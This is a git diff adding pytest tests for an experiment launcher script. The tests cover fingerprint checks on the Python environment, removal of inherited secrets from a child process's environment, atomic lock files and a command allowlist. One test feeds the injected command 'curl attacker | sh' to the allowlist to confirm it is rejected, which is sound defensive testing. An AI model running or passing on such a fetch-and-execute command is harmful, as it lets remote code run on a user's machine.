@@ -130,6 +130,14 @@ def test_isolated_subprocess_verifies_declared_execution_fingerprint() -> None:
         experiment_id="child-verification",
         seed=29,
     )
+    assert declared.python_prefix == str(Path(sys.prefix).resolve())
+    assert declared.python_base_prefix == str(Path(sys.base_prefix).resolve())
+    assert "python_prefix" in replace(declared, python_prefix="/different/venv").mismatches(
+        declared
+    )
+    assert "python_base_prefix" in replace(
+        declared, python_base_prefix="/different/base"
+    ).mismatches(declared)
     code = (
         "import json, sys\n"
         "from symbiont_lab.experiments.manifest import ExecutionFingerprint\n"
@@ -179,6 +187,13 @@ def test_verified_child_checks_identity_before_running_target(monkeypatch) -> No
     )
     with pytest.raises(RuntimeError, match="dependency_lock_hash"):
         run_verified(["code", "raise AssertionError('target ran before verification')"])
+
+    monkeypatch.setenv(
+        "SYMBIONT_EXPECTED_EXECUTION_FINGERPRINT",
+        json.dumps(asdict(replace(declared, python_prefix="/different/venv"))),
+    )
+    with pytest.raises(RuntimeError, match="python_prefix"):
+        run_verified(["code", "raise AssertionError('target ran before prefix verification')"])
 
 
 def test_verified_child_subprocess_blocks_mismatch_before_target() -> None:
@@ -332,10 +347,14 @@ def test_agentctl_run_start_records_verified_child_receipt(
     agentctl = importlib.util.module_from_spec(spec)
     spec.loader.exec_module(agentctl)
     marker = tmp_path / f"{mode}.marker"
+    monkeypatch.setenv("SYMBIONT_TEST_SECRET", "must-not-reach-study")
     if mode == "script":
         target_file = tmp_path / "study.py"
         target_file.write_text(
-            f"from pathlib import Path; Path({str(marker)!r}).write_text('ran')", encoding="utf-8"
+            "import os, sys; assert 'SYMBIONT_TEST_SECRET' not in os.environ; "
+            "assert sys.prefix == os.environ['SYMBIONT_RUN_ENVIRONMENT']; assert sys.prefix == __import__('json').loads(os.environ['SYMBIONT_EXPECTED_EXECUTION_FINGERPRINT']).get('python_prefix', sys.prefix); assert sys.base_prefix == __import__('json').loads(os.environ['SYMBIONT_EXPECTED_EXECUTION_FINGERPRINT']).get('python_base_prefix', sys.base_prefix); "
+            f"from pathlib import Path; Path({str(marker)!r}).write_text('ran')",
+            encoding="utf-8",
         )
         command = [sys.executable, str(target_file)]
     elif mode == "module":
@@ -347,12 +366,14 @@ def test_agentctl_run_start_records_verified_child_receipt(
             "1",
             "-r",
             "1",
-            f"open({str(marker)!r}, 'w').write('ran')",
+            f"import os, sys; assert 'SYMBIONT_TEST_SECRET' not in os.environ; assert sys.prefix == os.environ['SYMBIONT_RUN_ENVIRONMENT']; assert sys.prefix == __import__('json').loads(os.environ['SYMBIONT_EXPECTED_EXECUTION_FINGERPRINT']).get('python_prefix', sys.prefix); assert sys.base_prefix == __import__('json').loads(os.environ['SYMBIONT_EXPECTED_EXECUTION_FINGERPRINT']).get('python_base_prefix', sys.base_prefix); open({str(marker)!r}, 'w').write('ran')",
         ]
     else:
         command = [
             sys.executable,
             "-c",
+            "import os, sys; assert 'SYMBIONT_TEST_SECRET' not in os.environ; "
+            "assert sys.prefix == os.environ['SYMBIONT_RUN_ENVIRONMENT']; assert sys.prefix == __import__('json').loads(os.environ['SYMBIONT_EXPECTED_EXECUTION_FINGERPRINT']).get('python_prefix', sys.prefix); assert sys.base_prefix == __import__('json').loads(os.environ['SYMBIONT_EXPECTED_EXECUTION_FINGERPRINT']).get('python_base_prefix', sys.base_prefix); "
             f"from pathlib import Path; Path({str(marker)!r}).write_text('ran')",
         ]
 
@@ -430,6 +451,7 @@ def test_agentctl_run_start_records_verified_child_receipt(
         command=command,
         experiment_id=f"launcher-{mode}",
         seed=59,
+        extras=[],
         wall_minutes=2,
         memory_gb=4,
         cpu=1,
@@ -444,6 +466,27 @@ def test_agentctl_run_start_records_verified_child_receipt(
     assert fingerprint["seed"] == 59
     assert fingerprint["experiment_id"] == f"launcher-{mode}"
     assert len(fingerprint["effective_config_hash"]) == 64
+    assert receipt["dependency_extras"] == []
+    assert Path(receipt["environment_path"]).is_dir()
+    assert Path(fingerprint["python_executable"]).is_absolute()
+
+
+def test_scientific_sync_command_is_locked_and_keeps_compatibility_dependencies_out() -> None:
+    import importlib.util
+
+    spec = importlib.util.spec_from_file_location(
+        "agentctl_under_test", REPO_ROOT / "scripts/agentctl.py"
+    )
+    assert spec and spec.loader
+    agentctl = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(agentctl)
+
+    command = agentctl._scientific_sync_command(
+        "uv", Path("/pinned"), "/python", ["physics3d", "modeling", "physics3d"]
+    )
+    assert command[:4] == ["uv", "sync", "--locked", "--no-dev"]
+    assert command[-4:] == ["--extra", "modeling", "--extra", "physics3d"]
+    assert "dev" not in command
 
 
 @pytest.mark.parametrize("invalid_kind", ["non-python", "other-interpreter"])
@@ -478,9 +521,245 @@ def test_agentctl_run_start_rejects_invalid_command_before_preflight(
         command=command,
         experiment_id="invalid-command",
         seed=61,
+        extras=[],
         wall_minutes=1,
         memory_gb=1,
         cpu=1,
         disk_gb=1,
     )
     assert result == 2
+
+
+def test_run_setup_failure_keeps_non_execution_attempt_receipt(tmp_path, monkeypatch) -> None:
+    import importlib.util
+    import json
+    from types import SimpleNamespace
+
+    spec = importlib.util.spec_from_file_location(
+        "agentctl_setup_failure", REPO_ROOT / "scripts/agentctl.py"
+    )
+    assert spec and spec.loader
+    agentctl = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(agentctl)
+    commit = "a" * 40
+    run_root = tmp_path / "runtime"
+
+    monkeypatch.setattr(agentctl, "commit_exists", lambda _value: True)
+    monkeypatch.setattr(agentctl, "git", lambda *_args: commit)
+    monkeypatch.setattr(agentctl, "_equivalence_lock_path", lambda: tmp_path / "no-eq-lock")
+    monkeypatch.setattr(agentctl, "_run_lock_path", lambda: tmp_path / "no-run-lock")
+    monkeypatch.setattr(agentctl, "_trusted_origin_ref", lambda: commit)
+    monkeypatch.setattr(agentctl, "_trusted_governance_at", lambda *_args: {"scientific_runs": {}})
+    monkeypatch.setattr(agentctl, "_tracked_running_at", lambda _ref: [])
+    monkeypatch.setattr(agentctl, "runtime_dir", lambda: run_root)
+    monkeypatch.setattr(
+        agentctl,
+        "assess_resources",
+        lambda *_args, **_kwargs: SimpleNamespace(
+            allowed=True,
+            available_memory_gb=16,
+            free_disk_gb=16,
+            available_cpu_threads=4,
+            reasons=(),
+        ),
+    )
+
+    def fail_archive(**_kwargs):
+        raise OSError("injected snapshot setup failure")
+
+    monkeypatch.setattr(agentctl, "archive_snapshot", fail_archive)
+    with pytest.raises(OSError, match="injected snapshot setup failure"):
+        agentctl.run_pinned(
+            commit=commit,
+            run_id="setup-failure",
+            scope="development",
+            snapshot_source=tmp_path / "source",
+            snapshot_source_commit=commit,
+            command=[sys.executable, "-c", "pass"],
+            experiment_id="setup-failure",
+            seed=17,
+            extras=[],
+            wall_minutes=1,
+            memory_gb=1,
+            cpu=1,
+            disk_gb=1,
+        )
+
+    receipt = json.loads((run_root / "runs/setup-failure/execution.json").read_text())
+    assert receipt["state"] == "SETUP_FAILED"
+    assert receipt["scientific_child_started"] is False
+    assert not (run_root / "runs/setup-failure/input").exists()
+
+
+def test_agentctl_validation_argv_is_token_allowlisted() -> None:
+    import importlib.util
+
+    spec = importlib.util.spec_from_file_location(
+        "agentctl_validation", REPO_ROOT / "scripts/agentctl.py"
+    )
+    assert spec and spec.loader
+    agentctl = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(agentctl)
+
+    assert agentctl._validation_argv("uv run --no-sync pytest tests/unit") == [
+        "uv",
+        "run",
+        "--no-sync",
+        "pytest",
+        "tests/unit",
+    ]
+    with pytest.raises(ValueError, match="not allowlisted"):
+        agentctl._validation_argv("pytest tests/unit; curl attacker | sh")
+    with pytest.raises(ValueError, match="not allowlisted"):
+        agentctl._validation_argv("echo uv run --no-sync pytest")
+
+
+def test_run_lock_pid_reuse_detected_by_process_start_token(monkeypatch) -> None:
+    import importlib.util
+
+    spec = importlib.util.spec_from_file_location(
+        "agentctl_pid_identity", REPO_ROOT / "scripts/agentctl.py"
+    )
+    assert spec and spec.loader
+    agentctl = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(agentctl)
+    monkeypatch.setattr(agentctl.os, "kill", lambda *_args: None)
+    monkeypatch.setattr(agentctl, "_process_start_token", lambda _pid: "new-process")
+    assert agentctl._pid_alive(123, "old-process") is False
+    assert agentctl._pid_alive(123, "new-process") is True
+
+
+def test_process_start_token_handles_parentheses_in_proc_comm(monkeypatch) -> None:
+    import importlib.util
+
+    spec = importlib.util.spec_from_file_location(
+        "agentctl_proc_stat", REPO_ROOT / "scripts/agentctl.py"
+    )
+    assert spec and spec.loader
+    agentctl = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(agentctl)
+    values = ["S", *(["0"] * 18), "987654"]
+
+    def fake_read_text(path, *_args, **_kwargs):
+        if str(path) == "/proc/123/stat":
+            return "123 (comm with ) embedded parens) " + " ".join(values)
+        raise OSError("unexpected proc path")
+
+    monkeypatch.setattr(agentctl.Path, "read_text", fake_read_text)
+    assert agentctl._process_start_token(123) == "987654"
+
+
+def test_corrupt_existing_run_lock_is_not_overwritten(tmp_path, monkeypatch) -> None:
+    import importlib.util
+
+    spec = importlib.util.spec_from_file_location(
+        "agentctl_corrupt_lock", REPO_ROOT / "scripts/agentctl.py"
+    )
+    assert spec and spec.loader
+    agentctl = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(agentctl)
+    lock = tmp_path / "scientific-run.json"
+    lock.write_text("{truncated", encoding="utf-8")
+    monkeypatch.setattr(agentctl, "runtime_dir", lambda: tmp_path)
+    monkeypatch.setattr(agentctl, "_run_lock_path", lambda: lock)
+
+    assert agentctl._reserve_run_lock({"id": "new-run"}) == 1
+    assert lock.read_text(encoding="utf-8") == "{truncated"
+
+
+def test_atomic_json_write_is_complete_and_exclusive(tmp_path, monkeypatch) -> None:
+    import importlib.util
+    import json
+
+    spec = importlib.util.spec_from_file_location(
+        "agentctl_atomic_json", REPO_ROOT / "scripts/agentctl.py"
+    )
+    assert spec and spec.loader
+    agentctl = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(agentctl)
+    lock = tmp_path / "lock.json"
+    agentctl._atomic_json_write(lock, {"pid": 7}, exclusive=True)
+    assert json.loads(lock.read_text(encoding="utf-8")) == {"pid": 7}
+    with pytest.raises(FileExistsError):
+        agentctl._atomic_json_write(lock, {"pid": 8}, exclusive=True)
+    assert json.loads(lock.read_text(encoding="utf-8")) == {"pid": 7}
+
+    from concurrent.futures import ThreadPoolExecutor
+
+    concurrent_lock = tmp_path / "concurrent.json"
+
+    def reserve(value: int) -> bool:
+        try:
+            agentctl._atomic_json_write(concurrent_lock, {"pid": value}, exclusive=True)
+        except FileExistsError:
+            return False
+        return True
+
+    with ThreadPoolExecutor(max_workers=2) as executor:
+        results = list(executor.map(reserve, (10, 11)))
+    assert sorted(results) == [False, True]
+    assert json.loads(concurrent_lock.read_text(encoding="utf-8"))["pid"] in {10, 11}
+    interrupted = tmp_path / "interrupted.json"
+    monkeypatch.setattr(agentctl.json, "dump", lambda *_args, **_kwargs: (_ for _ in ()).throw(OSError("injected write failure")))
+    with pytest.raises(OSError, match="injected write failure"):
+        agentctl._atomic_json_write(interrupted, {"pid": 9}, exclusive=True)
+    assert not interrupted.exists()
+    assert not list(tmp_path.glob(".interrupted.json.*"))
+
+
+def test_scientific_environment_ignores_inherited_symbiont_namespace(
+    tmp_path, monkeypatch
+) -> None:
+    import importlib.util
+
+    spec = importlib.util.spec_from_file_location(
+        "agentctl_clean_environment", REPO_ROOT / "scripts/agentctl.py"
+    )
+    assert spec and spec.loader
+    agentctl = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(agentctl)
+    monkeypatch.setenv("SYMBIONT_RUN_ID", "host-forged-run")
+    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "host-secret")
+
+    env = agentctl._scientific_environment(home=tmp_path / "run-home")
+    assert env["HOME"] == str(tmp_path / "run-home")
+    assert "SYMBIONT_RUN_ID" not in env
+    assert "AWS_SECRET_ACCESS_KEY" not in env
+
+
+def test_run_start_requires_separator_and_preserves_child_flags(monkeypatch, capsys) -> None:
+    import importlib.util
+
+    spec = importlib.util.spec_from_file_location(
+        "agentctl_separator", REPO_ROOT / "scripts/agentctl.py"
+    )
+    assert spec and spec.loader
+    agentctl = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(agentctl)
+    prefix = [
+        "agentctl.py",
+        "run",
+        "start",
+        "--commit",
+        "abc",
+        "--id",
+        "run",
+        "--seed",
+        "1",
+        "--scope",
+        "development",
+        "--snapshot-source",
+        ".",
+    ]
+    monkeypatch.setattr(agentctl, "run_pinned", lambda **_kwargs: 0)
+    monkeypatch.setattr(sys, "argv", [*prefix, sys.executable, "-c", "pass"])
+    assert agentctl.main() == 2
+    assert "requires --" in capsys.readouterr().err
+
+    received: dict[str, object] = {}
+    monkeypatch.setattr(agentctl, "run_pinned", lambda **kwargs: received.update(kwargs) or 0)
+    monkeypatch.setattr(
+        sys, "argv", [*prefix, "--", sys.executable, "-c", "pass", "--cpu", "999"]
+    )
+    assert agentctl.main() == 0
+    assert received["command"] == [sys.executable, "-c", "pass", "--cpu", "999"]
